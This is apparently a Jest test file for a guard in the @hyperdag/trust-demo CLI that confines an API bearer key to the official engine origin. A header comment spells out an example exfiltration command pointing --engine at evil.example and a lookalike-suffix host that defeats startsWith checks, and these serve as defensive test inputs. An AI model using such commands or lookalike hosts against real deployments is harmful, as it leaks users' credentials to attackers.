/**
 * CREDENTIAL-EXFILTRATION FENCE for @hyperdag/trust-demo.
 *
 * THE PRIMITIVE THIS REMOVES. `halRequestHeaders` attaches `REPID_API_KEY` as a bearer
 * token, and `--engine <url>` retargets the CLI. Together:
 *
 *     REPID_API_KEY=… npx @hyperdag/trust-demo --engine https://evil.example
 *
 * hands the user's key to a stranger — a credential-exfiltration primitive shipped inside
 * a security demo, triggered by a command line that reads as entirely reasonable ("try it
 * against my deployment"). Demonstrated against a local hostile engine: before the guard
 * its logs recorded `Bearer sk-secret-…`; after it, zero Authorization headers.
 *
 * The lookalike case is the one worth a test of its own: a `startsWith` check on the
 * official URL would happily send the key to
 * `https://repid-engine-production.up.railway.app.evil.com`.
 */
import { execFileSync } from 'node:child_process';
import path from 'node:path';

const MOD = path.resolve(__dirname, '../packages/trust-demo/src/engine-trust.mjs').replace(/\\/g, '/');
const OFFICIAL = 'https://repid-engine-production.up.railway.app';

function may(url: string, optIn = false): any {
  const src = `
    import { maySendKey } from '${MOD}';
    process.stdout.write(JSON.stringify(maySendKey(${JSON.stringify(url)}, { optIn: ${optIn} })));`;
  return JSON.parse(execFileSync(process.execPath, ['--input-type=module', '-e', src], { encoding: 'utf8' }));
}

describe('the key goes to the official engine and nowhere else', () => {
  test('official origin is allowed', () => {
    expect(may(OFFICIAL).allowed).toBe(true);
    expect(may(`${OFFICIAL}/api/v1/whatever`).allowed).toBe(true);
  });

  test.each([
    ['a plainly hostile host', 'https://evil.example'],
    ['a lookalike suffix that defeats startsWith', 'https://repid-engine-production.up.railway.app.evil.com'],
    ['the official host over plaintext http', 'http://repid-engine-production.up.railway.app'],
    ['a different railway app', 'https://something-else.up.railway.app'],
    ['localhost', 'http://127.0.0.1:8787'],
    ['an unparseable url', 'not a url'],
  ])('refuses %s', (_name, url) => {
    expect(may(url).allowed).toBe(false);
  });

  test('explicit opt-in permits a custom engine — an escape hatch, not a default', () => {
    expect(may('http://127.0.0.1:8787', true).allowed).toBe(true);
    expect(may('https://evil.example', true).allowed).toBe(true);
  });

  test('an unparseable URL is refused even WITH opt-in — nothing to compare', () => {
    expect(may('not a url', true).allowed).toBe(false);
  });

  test('every decision carries a reason the CLI can print', () => {
    for (const u of [OFFICIAL, 'https://evil.example', 'not a url']) {
      expect(typeof may(u).reason).toBe('string');
      expect(may(u).reason.length).toBeGreaterThan(0);
    }
  });
});
